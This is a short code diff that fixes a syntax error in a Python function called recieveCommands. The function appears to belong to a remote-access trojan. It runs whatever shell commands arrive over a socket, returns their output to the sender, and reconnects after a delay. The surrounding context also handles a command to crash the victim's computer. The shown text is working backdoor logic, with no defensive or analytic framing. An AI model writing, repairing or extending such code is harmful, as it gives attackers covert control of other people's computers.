@@ -169,11 +169,12 @@ def recieveCommands():
             except:
                 error = '\n' + RED + BOLD + '[!] There was an error in attempting to crash the computer' + END + '\n'
                 s.send(str.encode(error))
-        else len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_bytes, "utf-8")
-            s.send(str.encode(output_str))
+        else:
+            if len(data) > 0:
+                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8")
+                s.send(str.encode(output_str))
     if s.close():
         time.sleep(20)
         main()
